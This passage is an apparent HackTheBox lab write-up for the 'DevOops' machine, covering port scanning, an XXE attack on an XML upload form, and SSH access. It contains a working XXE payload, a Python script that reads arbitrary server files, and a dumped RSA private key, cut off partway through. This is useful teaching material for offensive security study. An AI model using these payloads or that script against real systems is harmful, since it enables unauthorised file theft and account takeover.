@@ -1,0 +1,598 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: DevOops</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#htb-devoops">htb-devoops</a> <a class="post-tag" href="/tags#xxe">xxe</a> <a class="post-tag" href="/tags#ssh">ssh</a> <a class="post-tag" href="/tags#git">git</a> <a class="post-tag" href="/tags#python-pickle">python-pickle</a> <a class="post-tag" href="/tags#deserialization">deserialization</a> <a class="post-tag" href="/tags#htb-canape">htb-canape</a> <a class="post-tag" href="/tags#rss">rss</a> </span><br/><br/>
+<time class="dt-published" datetime="2018-10-13T14:58:15+00:00" itemprop="datePublished">Oct 13, 2018
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2018/10/13/htb-devoops.html" style="color: #e6e6e6; text-decoration: none;">HTB: DevOops</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<p><img alt="Devoops Cover image" src="https://0xdfimages.gitlab.io/img/devoops-cover.png" style="float: right;margin-right:50px; margin-left:50px">DevOops was a really fun box that did a great job of providing interesting challenges that weren’t too difficult to solve. I’ll show how to gain access using XXE to leak the users SSH key, and then how I get root by discovering the root SSH key in an old git commit. In Beyond Root, I’ll show an alternative path to user shell exploiting a python pickle deserialization bug.</img></p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/140 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/devoops" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">DevOops</a> <a href="https://hackthebox.com/machines/devoops" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-devoops.webp" type="image/webp"/> <img alt="DevOops" class="img-av" src="/icons/box-devoops.png"/></picture></a><br/><a href="https://hackthebox.com/machines/devoops" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right">02 Jun 2018</td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">04 May 2024</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Linux <picture><source srcset="/icons/Linux.webp" type="image/webp"/><img alt="Linux" class="img-os" src="/icons/Linux.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Medium">Medium [30]</span></td>
+</tr>
+<tr>
+<td>Rated Difficulty</td>
+<td style="text-align: right"><picture><source srcset="/img/devoops-diff.webp" type="image/webp"/><img alt="Rated difficulty for DevOops" src="/img/devoops-diff.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td>Radar Graph</td>
+<td style="text-align: right"><picture><source srcset="/img/devoops-radar.webp" type="image/webp"/><img alt="Radar chart for DevOops" src="/img/devoops-radar.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">00:17:40</span><a href="https://app.hackthebox.com/users/29035" rel="noopener" target="_blank"><img alt="l0zi0" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/29035" style="display: unset"/><span class="user-text" style="display: none"> l0zi0</span></a><br/></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">00:39:09</span><a href="https://app.hackthebox.com/users/40913" rel="noopener" target="_blank"><img alt="frozenbrain" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/40913" style="display: unset"/><span class="user-text" style="display: none"> frozenbrain</span></a><br/></td>
+</tr>
+<tr>
+<td>Creator</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/28020" rel="noopener" target="_blank"><img alt="lokori" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/28020" style="display: unset"/><span class="user-text" style="display: none"> lokori</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> shows two ports, ssh and http on port 5000. The host OS is likely Ubuntu, and likely <a href="https://packages.ubuntu.com/xenial/openssh-server">16.04 Xenial</a> based on the ssh version. Port 5000 is the default port for Flask, so this could be a gunicorn hosted Flask site.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>nmap <span class="nt">-sT</span> <span class="nt">-p-</span> <span class="nt">--min-rate</span> 5000 10.10.10.91
+<span class="go">Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-11 16:53 EDT
+Nmap scan report for 10.10.10.91
+Host is up (0.019s latency).
+Not shown: 65533 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+5000/tcp open  upnp
+
+Nmap done: 1 IP address (1 host up) scanned in 7.91 seconds
+
+</span><span class="gp">root@kali#</span><span class="w"> </span>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p</span> 22,5000 10.10.10.91
+<span class="go">Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-11 16:54 EDT
+Nmap scan report for 10.10.10.91
+Host is up (0.018s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 42:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 (RSA)
+|   256 b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 (ECDSA)
+|_  256 d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 (ED25519)
+5000/tcp open  http    Gunicorn 19.7.1
+|_http-server-header: gunicorn/19.7.1
+|_http-title: Site doesn't have a title (text/html; charset=utf-8).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.56 seconds
+</span></code></pre></div></div>
+<h3 id="http---port-5000">HTTP - Port 5000</h3>
+<h4 id="site">Site</h4>
+<p>The main site has one big image, and some under construction text.</p>
+<p><img alt="1528024133069" src="https://0xdfimages.gitlab.io/img/1528024133069.png"/></p>
+<p>The site says it will be the “MVP for a Blogfeeder application”. MVP likely means Minimum Viable Product, which makes sense since the next line says it’ll be replaced by a “proper feed”.</p>
+<h4 id="gobuster">gobuster</h4>
+<p>Start a <code class="language-plaintext highlighter-rouge">gobuster</code> for enumeration, and find two paths:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>gobuster <span class="nt">-u</span> http://10.10.10.91:5000 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-x</span> txt <span class="nt">-t</span> 30
+<span class="go">
+Gobuster v1.4.1              OJ Reeves (@TheColonial)
+=====================================================
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.10.91:5000/
+[+] Threads      : 30
+[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes : 301,302,307,200,204
+[+] Extensions   : .txt
+=====================================================
+/feed (Status: 200)
+/upload (Status: 200)
+</span></code></pre></div></div>
+<h4 id="feed">/feed</h4>
+<p>This is the image source for the image in the page root.</p>
+<h4 id="upload">/upload</h4>
+<p>The upload path gives a test API interface to upload files as a development tool, and gives a hint about the file format being xml and what elements are expected.</p>
+<p><img alt="1528139555306" src="https://0xdfimages.gitlab.io/img/1528139555306.png"/></p>
+<h2 id="xxe-file-read">XXE File Read</h2>
+<h3 id="benign-interaction-with-upload">Benign Interaction with /upload</h3>
+<p>Based on the hint from the site, I’ll start by trying to upload an XML file that looks like this:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;Author&gt;</span>0xdf<span class="nt">&lt;/Author&gt;</span>
+<span class="nt">&lt;Subject&gt;</span>Testing<span class="nt">&lt;/Subject&gt;</span>
+<span class="nt">&lt;Content&gt;</span>This is a test<span class="nt">&lt;/Content&gt;</span>
+</code></pre></div></div>
+<p>Unfortunately, submitting that responds with a 500 status:</p>
+<p><img alt="1528139640888" src="https://0xdfimages.gitlab.io/img/1528139640888.png"/></p>
+<p>Since I know this is going to be a blog feed, which are typically run on xml-based rss, I’ll look into that standard. Let’s grab the feed.xml file from this blog, which is located at <code class="language-plaintext highlighter-rouge">https://0xdf.gitlab.io</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>curl <span class="nt">-s</span> https://0xdf.gitlab.io/feed.xml | xmllint <span class="nt">--format</span> - | <span class="nb">head</span> <span class="nt">-16</span>
+<span class="cp">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
+<span class="nt">&lt;feed</span> <span class="na">xmlns=</span><span class="s">"http://www.w3.org/2005/Atom"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;generator</span> <span class="na">uri=</span><span class="s">"https://jekyllrb.com/"</span> <span class="na">version=</span><span class="s">"3.8.4"</span><span class="nt">&gt;</span>Jekyll<span class="nt">&lt;/generator&gt;</span>
+  <span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"https://0xdf.gitlab.io/feed.xml"</span> <span class="na">rel=</span><span class="s">"self"</span> <span class="na">type=</span><span class="s">"application/atom+xml"</span><span class="nt">/&gt;</span>
+  <span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"https://0xdf.gitlab.io/"</span> <span class="na">rel=</span><span class="s">"alternate"</span> <span class="na">type=</span><span class="s">"text/html"</span><span class="nt">/&gt;</span>
+  <span class="nt">&lt;updated&gt;</span>2018-10-11T20:03:14+00:00<span class="nt">&lt;/updated&gt;</span>
+  <span class="nt">&lt;id&gt;</span>https://0xdf.gitlab.io/feed.xml<span class="nt">&lt;/id&gt;</span>
+  <span class="nt">&lt;title</span> <span class="na">type=</span><span class="s">"html"</span><span class="nt">&gt;</span>0xdf hacks stuff<span class="nt">&lt;/title&gt;</span>
+  <span class="nt">&lt;subtitle&gt;</span>CTF solutions, malware analysis, home lab development<span class="nt">&lt;/subtitle&gt;</span>
+  <span class="nt">&lt;entry&gt;</span>
+    <span class="nt">&lt;title</span> <span class="na">type=</span><span class="s">"html"</span><span class="nt">&gt;</span>PWK Notes: Post-Exploitation Windows File Transfers with SMB<span class="nt">&lt;/title&gt;</span>
+    <span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"https://0xdf.gitlab.io/2018/10/11/pwk-notes-post-exploitation-windows-file-transfers.html"</span> <span class="na">rel=</span><span class="s">"alternate"</span> <span class="na">type=</span><span class="s">"text/html"</span> <span class="na">title=</span><span class="s">"PWK Notes: Post-Exploitation Windows File Transfers with SMB"</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;published&gt;</span>2018-10-11T13:23:26+00:00<span class="nt">&lt;/published&gt;</span>
+    <span class="nt">&lt;updated&gt;</span>2018-10-11T13:23:26+00:00<span class="nt">&lt;/updated&gt;</span>
+    <span class="nt">&lt;id&gt;</span>https://0xdf.gitlab.io/2018/10/11/pwk-notes-post-exploitation-windows-file-transfers<span class="nt">&lt;/id&gt;</span>
+    <span class="nt">&lt;content</span> <span class="na">type=</span><span class="s">"html"</span> <span class="na">xml:base=</span><span class="s">"https://0xdf.gitlab.io/2018/10/11/pwk-notes-post-exploitation-windows-file-transfers.html"</span><span class="nt">&gt;</span><span class="ni">&amp;lt;</span>p<span class="ni">&amp;gt;</span>Moving files to and from a compromised Linux machine is, in general, pretty easy. You
+’ve got nc, wget, curl, and if you get really desperate, base64 copy and paste. Windows, is another issue all together. PowerShell makes this somewhat easier, but for a lot of the PWK labs, the systems are too old to have PowerShell. The course material goes over a few ways to achieve this, but they don’t cover my favorite - SMB. This may be less realistic in an environment where you have to connect from a victim machine back to your attacker box over the public internet (where SMB could be blocked), but for environments like PWK labs and HTB where you are vpned into the same LAN as your targets, it works great.<span class="ni">&amp;lt;</span>/p<span class="ni">&amp;gt;</span>
+
+</code></pre></div></div>
+<p>After the information about the blog in general, there’s an <code class="language-plaintext highlighter-rouge">&lt;entry&gt;</code> section, and inside that is a <code class="language-plaintext highlighter-rouge">&lt;content&gt;</code> tag. And while there’s no <code class="language-plaintext highlighter-rouge">&lt;author&gt;</code> or <code class="language-plaintext highlighter-rouge">&lt;subject&gt;</code>, those would seem like they might fit there, so let’s give that a try.</p>
+<p>Submit this file:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;entry&gt;</span>
+<span class="nt">&lt;Author&gt;</span>0xdf<span class="nt">&lt;/Author&gt;</span>
+<span class="nt">&lt;Subject&gt;</span>Testing<span class="nt">&lt;/Subject&gt;</span>
+<span class="nt">&lt;Content&gt;</span>This is a test<span class="nt">&lt;/Content&gt;</span>
+<span class="nt">&lt;/entry&gt;</span>
+</code></pre></div></div>
+<p>And get this response:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">gunicorn/19.7.1</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Mon, 04 Jun 2018 19:17:00 GMT</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=utf-8</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">163</span>
+
+ PROCESSED BLOGPOST:
+  Author: 0xdf
+ Subject: Testing
+ Content: This is a test
+ URL for later reference: /uploads/0xdf.xml
+ File path: /home/roosa/deploy/src
+</code></pre></div></div>
+<p>Further more, the file is where they say it is:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>curl http://10.10.10.91:5000/uploads/0xdf.xml
+<span class="nt">&lt;item&gt;</span>
+<span class="nt">&lt;Author&gt;</span>0xdf<span class="nt">&lt;/Author&gt;</span>
+<span class="nt">&lt;Subject&gt;</span>Testing<span class="nt">&lt;/Subject&gt;</span>
+<span class="nt">&lt;Content&gt;</span>This is a test<span class="nt">&lt;/Content&gt;</span>
+<span class="nt">&lt;/item&gt;</span>
+</code></pre></div></div>
+<h3 id="xxe-poc">XXE POC</h3>
+<p>With that understanding of how to interact with the site, I’ll start looking for an XXE attack. Since the xml is displayed back to me, I can use a direct method, reading a file into an entity, and then calling it:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/upload</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">10.10.10.91:5000</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://10.10.10.91:5000/upload</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">multipart/form-data; boundary=---------------------------1864243787215350191713873567</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">465</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+
+-----------------------------1864243787215350191713873567
+Content-Disposition: form-data; name="file"; filename="0xdf.xml"
+Content-Type: text/xml
+
+&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ELEMENT foo ANY&gt;
+  &lt;!ENTITY bar SYSTEM
+  "file:///etc/lsb-release"&gt;
+]&gt;
+
+&lt;item&gt;
+&lt;Author&gt;
+  &amp;bar;
+&lt;/Author&gt;
+&lt;Subject&gt;Testing&lt;/Subject&gt;
+&lt;Content&gt;This is a test&lt;/Content&gt;
+&lt;/item&gt;
+-----------------------------1864243787215350191713873567--
+</code></pre></div></div>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">gunicorn/19.7.1</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Mon, 04 Jun 2018 19:42:16 GMT</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=utf-8</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">268</span>
+
+ PROCESSED BLOGPOST:
+  Author:
+  DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=16.04
+DISTRIB_CODENAME=xenial
+DISTRIB_DESCRIPTION="Ubuntu 16.04.4 LTS"
+
+
+ Subject: Testing
+ Content: This is a test
+ URL for later reference: /uploads/0xdf.xml
+ File path: /home/roosa/deploy/src
+</code></pre></div></div>
+<p>Now we have arbitrary file read on the box, as least as far as this user can read.</p>
+<h3 id="bash-oneliner-to-grab-files">Bash OneLiner to grab files</h3>
+<p>When I originally solved this box 4 months ago, I wrote a bash one-liner to allow me to quickly grab different files.</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span><span class="nv">file</span><span class="o">=</span>/etc/lsb-release
+<span class="gp">root@kali#</span><span class="w"> </span><span class="nv">new</span><span class="o">=</span>/home/roosa/.ssh/id_rsa<span class="p">;</span> <span class="nb">sed</span> <span class="nt">-i</span> <span class="nt">-e</span> <span class="s2">"s|</span><span class="k">${</span><span class="nv">file</span><span class="k">}</span><span class="s2">|</span><span class="k">${</span><span class="nv">new</span><span class="k">}</span><span class="s2">|g"</span> upload.xml<span class="p">;</span> <span class="nv">file</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nt">-n</span> <span class="nv">$new</span><span class="si">)</span><span class="p">;</span> curl <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="nt">-F</span> <span class="s2">"file=@upload.xml;filename=upload.xml"</span> http://10.10.10.91:5000/upload <span class="nt">-x</span> 127.0.0.1:8080 | <span class="nb">grep</span> <span class="nt">-zo</span> <span class="s2">"Author:.*Subject"</span> | strings | <span class="nb">grep</span> <span class="nt">-v</span> <span class="nt">-e</span> <span class="s2">"Author:"</span> <span class="nt">-e</span> <span class="s2">"Subject"</span> |  <span class="nb">tee </span>loot/<span class="si">$(</span><span class="nb">echo</span> <span class="nv">$file</span> | rev | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">'/'</span> <span class="nt">-f1</span> | rev<span class="si">)</span>
+</code></pre></div></div>
+<p>It does the following:</p>
+<ol>
+<li>Start with <code class="language-plaintext highlighter-rouge">file</code> as existing file read in the xxe file.</li>
+<li>At the start of the line, set the new file you want to get.</li>
+<li>It then replaces the old file with the new file in <code class="language-plaintext highlighter-rouge">upload.xml</code></li>
+<li>post the file and grep out the file contents from the response</li>
+<li><code class="language-plaintext highlighter-rouge">tee</code> the output to the filename in the <code class="language-plaintext highlighter-rouge">loot/</code> path</li>
+</ol>
+<h3 id="better-automation-python-script">Better Automation: Python Script</h3>
+<p>In writing this post today, I decided that oneliner was too crude, and I needed a quick python script. Here’s <code class="language-plaintext highlighter-rouge">devoops_get.py</code>:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+</span>
+<span class="kn">import</span> <span class="n">re</span>
+<span class="kn">import</span> <span class="n">requests</span>
+<span class="kn">import</span> <span class="n">sys</span>
+
+<span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">usage: </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> [path to file]</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>
+
+<span class="n">file_name</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+
+<span class="n">xml</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'''</span><span class="s">&lt;?xml version=</span><span class="sh">"</span><span class="s">1.0</span><span class="sh">"</span><span class="s"> encoding=</span><span class="sh">"</span><span class="s">utf-8</span><span class="sh">"</span><span class="s">?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ELEMENT foo ANY&gt;
+  &lt;!ENTITY bar SYSTEM </span><span class="sh">"</span><span class="s">file://</span><span class="si">{</span><span class="n">file_name</span><span class="si">}</span><span class="sh">"</span><span class="s">&gt;
+]&gt;
+
+&lt;item&gt;
+&lt;Author&gt;
+&amp;bar;
+&lt;/Author&gt;
+&lt;Subject&gt;Testing&lt;/Subject&gt;
+&lt;Content&gt;This is a test&lt;/Content&gt;
+&lt;/item&gt;</span><span class="sh">'''</span>
+
+<span class="n">files</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">file</span><span class="sh">'</span><span class="p">:</span> <span class="p">(</span><span class="sh">'</span><span class="s">xxe.xml</span><span class="sh">'</span><span class="p">,</span> <span class="n">xml</span><span class="p">,</span> <span class="sh">'</span><span class="s">text/xml</span><span class="sh">'</span><span class="p">)}</span>
+<span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">http</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">http://127.0.0.1:8080</span><span class="sh">'</span><span class="p">}</span>
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="sh">'</span><span class="s">http://10.10.10.91:5000/upload</span><span class="sh">'</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+        <span class="n">pattern</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">compile</span><span class="p">(</span><span class="sa">r</span><span class="sh">"</span><span class="s">Author: \n(.*)\n Subject:</span><span class="sh">"</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="n">re</span><span class="p">.</span><span class="n">DOTALL</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="n">re</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">).</span><span class="nf">group</span><span class="p">(</span><span class="mi">1</span><span class="p">).</span><span class="nf">strip</span><span class="p">())</span>
+        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">pass</span>
+<span class="k">except</span> <span class="n">requests</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="nb">ConnectionError</span><span class="p">:</span>
+    <span class="k">pass</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[-] Unable to connect. Either site is down or file doesn</span><span class="sh">'</span><span class="s">t exist or can</span><span class="sh">'</span><span class="s">t be read by current user.</span><span class="sh">"</span><span class="p">)</span>
+</code></pre></div></div>
+<p>With this script, we can get whatever file we can read:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>./devoops_get.py /etc/lsb-release
+<span class="go">DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=16.04
+DISTRIB_CODENAME=xenial
+DISTRIB_DESCRIPTION="Ubuntu 16.04.4 LTS"
+
+</span><span class="gp">root@kali#</span><span class="w"> </span>./devoops_get.py /etc/shadow
+<span class="go">[-] Unable to connect. Either site is down or file doesn't exist or can't be read by current user.
+</span></code></pre></div></div>
+<h2 id="user-shell---ssh-as-roosa">User Shell - SSH as roosa</h2>
+<h3 id="get-rsa-key-for-roosa">Get RSA key for roosa</h3>
+<p>With the file read capabilities, first, get a list of users from <code class="language-plaintext highlighter-rouge">/etc/passwd</code>, grepping out users who can’t login. I’ll find 3 users:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>./devoops_get.py /etc/passwd | <span class="nb">grep</span> <span class="nt">-v</span> <span class="nt">-e</span> <span class="nb">false</span> <span class="nt">-e</span> nologin <span class="nt">-e</span> <span class="nb">sync</span>
+<span class="go">root:x:0:0:root:/root:/bin/bash
+git:x:1001:1001:git,,,:/home/git:/bin/bash
+roosa:x:1002:1002:,,,:/home/roosa:/bin/bash
+</span></code></pre></div></div>
+<p>As SSH is open, check each user for an RSA key:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>./devoops_get.py /root/.ssh/id_rsa
+<span class="go">[-] Unable to connect. Either site is down or file doesn't exist or can't be read by current user.
+</span><span class="gp">root@kali#</span><span class="w"> </span>./devoops_get.py /home/git/.ssh/id_rsa
+<span class="go">[-] Unable to connect. Either site is down or file doesn't exist or can't be read by current user.
+</span><span class="gp">root@kali#</span><span class="w"> </span>./devoops_get.py /home/roosa/.ssh/id_rsa
+<span class="go">-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAuMMt4qh/ib86xJBLmzePl6/5ZRNJkUj/Xuv1+d6nccTffb/7
+9sIXha2h4a4fp18F53jdx3PqEO7HAXlszAlBvGdg63i+LxWmu8p5BrTmEPl+cQ4J
+R/R+exNggHuqsp8rrcHq96lbXtORy8SOliUjfspPsWfY7JbktKyaQK0JunR25jVk
+v5YhGVeyaTNmSNPTlpZCVGVAp1RotWdc/0ex7qznq45wLb2tZFGE0xmYTeXgoaX4
+9QIQQnoi6DP3+7ErQSd6QGTq5mCvszpnTUsmwFj5JRdhjGszt0zBGllsVn99O90K
+m3pN8SN1yWCTal6FLUiuxXg99YSV0tEl0rfSUwIDAQABAoIBAB6rj69jZyB3lQrS
+JSrT80sr1At6QykR5ApewwtCcatKEgtu1iWlHIB9TTUIUYrYFEPTZYVZcY50BKbz
+ACNyme3rf0Q3W+K3BmF//80kNFi3Ac1EljfSlzhZBBjv7msOTxLd8OJBw8AfAMHB
+lCXKbnT6onYBlhnYBokTadu4nbfMm0ddJo5y32NaskFTAdAG882WkK5V5iszsE/3
+koarlmzP1M0KPyaVrID3vgAvuJo3P6ynOoXlmn/oncZZdtwmhEjC23XALItW+lh7
+e7ZKcMoH4J2W8OsbRXVF9YLSZz/AgHFI5XWp7V0Fyh2hp7UMe4dY0e1WKQn0wRKe
+8oa9wQkCgYEA2tpna+vm3yIwu4ee12x2GhU7lsw58dcXXfn3pGLW7vQr5XcSVoqJ
+Lk6u5T6VpcQTBCuM9+voiWDX0FUWE97obj8TYwL2vu2wk3ZJn00U83YQ4p9+tno6
+NipeFs5ggIBQDU1k1nrBY10TpuyDgZL+2vxpfz1SdaHgHFgZDWjaEtUCgYEA2B93
+hNNeXCaXAeS6NJHAxeTKOhapqRoJbNHjZAhsmCRENk6UhXyYCGxX40g7i7T15vt0
+ESzdXu+uAG0/s3VNEdU5VggLu3RzpD1ePt03eBvimsgnciWlw6xuZlG3UEQJW8sk
+A3+XsGjUpXv9TMt8XBf3muESRBmeVQUnp7RiVIcCgYBo9BZm7hGg7l+af1aQjuYw
+agBSuAwNy43cNpUpU3Ep1RT8DVdRA0z4VSmQrKvNfDN2a4BGIO86eqPkt/lHfD3R
+KRSeBfzY4VotzatO5wNmIjfExqJY1lL2SOkoXL5wwZgiWPxD00jM4wUapxAF4r2v
+vR7Gs1zJJuE4FpOlF6SFJQKBgHbHBHa5e9iFVOSzgiq2GA4qqYG3RtMq/hcSWzh0
+8MnE1MBL+5BJY3ztnnfJEQC9GZAyjh2KXLd6XlTZtfK4+vxcBUDk9x206IFRQOSn
